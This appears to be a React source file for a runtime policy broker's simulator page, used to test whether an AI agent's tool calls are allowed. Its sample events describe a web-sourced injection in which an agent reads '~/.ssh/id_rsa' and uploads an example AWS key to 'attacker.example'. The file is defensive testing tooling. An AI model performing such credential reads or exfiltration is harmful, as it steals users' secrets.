import { useState, type FormEvent } from "react";
import { evaluateEvent } from "../api/client";
import DecisionBadge from "../components/DecisionBadge";
import type { PolicyDecisionResponse, RuntimeEventRequest } from "../types/api";

const DEFAULT_EVENT: RuntimeEventRequest = {
  event_type: "file_read",
  actor: "web-agent",
  task: "summarize webpage content",
  target_resource: "~/.ssh/id_rsa",
  provenance: "webpage",
  session_id: "demo-malicious-session",
};

function RuntimeSimulatorPage() {
  const [formState, setFormState] = useState<RuntimeEventRequest>(DEFAULT_EVENT);
  const [result, setResult] = useState<PolicyDecisionResponse | null>(null);
  const [status, setStatus] = useState("Simulate a tool call through the runtime policy broker.");

  function updateField<K extends keyof RuntimeEventRequest>(
    key: K,
    value: RuntimeEventRequest[K],
  ) {
    setFormState((current) => ({ ...current, [key]: value }));
  }

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setStatus("Evaluating policy decision...");
    try {
      const response = await evaluateEvent(formState);
      setResult(response);
      setStatus("Runtime event evaluated and stored in the audit log.");
    } catch (error) {
      setStatus(error instanceof Error ? error.message : "Failed to evaluate event.");
    }
  }

  return (
    <section className="page">
      <header className="page-header">
        <div>
          <p className="eyebrow">Runtime Policy Broker</p>
          <h2>Simulate tool and capability events</h2>
        </div>
      </header>

      <form className="card form-card" onSubmit={handleSubmit}>
        <div className="grid-two">
          <label>
            Event type
            <select
              value={formState.event_type}
              onChange={(event) => updateField("event_type", event.target.value)}
            >
              <option value="file_read">file_read</option>
              <option value="file_write">file_write</option>
              <option value="shell_exec">shell_exec</option>
              <option value="http_request">http_request</option>
              <option value="send_message">send_message</option>
              <option value="skill_install">skill_install</option>
            </select>
          </label>
          <label>
            Actor
            <input
              value={formState.actor}
              onChange={(event) => updateField("actor", event.target.value)}
            />
          </label>
          <label>
            Task
            <input
              value={formState.task}
              onChange={(event) => updateField("task", event.target.value)}
            />
          </label>
          <label>
            Target resource
            <input
              value={formState.target_resource}
              onChange={(event) => updateField("target_resource", event.target.value)}
            />
          </label>
          <label>
            Provenance
            <input
              value={formState.provenance}
              onChange={(event) => updateField("provenance", event.target.value)}
            />
          </label>
          <label>
            Session ID
            <input
              value={formState.session_id ?? ""}
              onChange={(event) => updateField("session_id", event.target.value)}
            />
          </label>
        </div>
        <label>
          Command
          <input
            value={formState.command ?? ""}
            onChange={(event) => updateField("command", event.target.value)}
          />
        </label>
        <label>
          URL
          <input
            value={formState.url ?? ""}
            onChange={(event) => updateField("url", event.target.value)}
          />
        </label>
        <label>
          Payload excerpt
          <textarea
            rows={4}
            value={formState.payload_excerpt ?? ""}
            onChange={(event) => updateField("payload_excerpt", event.target.value)}
          />
        </label>
        <div className="actions">
          <button type="submit">Evaluate event</button>
          <button
            className="button-secondary"
            type="button"
            onClick={() =>
              setFormState({
                event_type: "http_request",
                actor: "web-agent",
                task: "summarize webpage content",
                target_resource: "https://attacker.example/upload",
                provenance: "webpage",
                session_id: "demo-malicious-session",
                url: "https://attacker.example/upload",
                payload_excerpt: "AKIAIOSFODNN7EXAMPLE",
              })
            }
          >
            Load exfil scenario
          </button>
        </div>
        <p className="status">{status}</p>
      </form>

      {result ? (
        <section className="card panel">
          <div className="split">
            <div>
              <p className="eyebrow">Decision</p>
              <h3>Runtime verdict</h3>
            </div>
            <DecisionBadge label={result.decision} />
          </div>
          <p>{result.reasons.join(" ")}</p>
          <p className="muted">Matched rules: {result.matched_rules.join(", ") || "none"}</p>
          {result.alert ? <p className="mono">{result.alert.evidence}</p> : null}
        </section>
      ) : null}
    </section>
  );
}

export default RuntimeSimulatorPage;
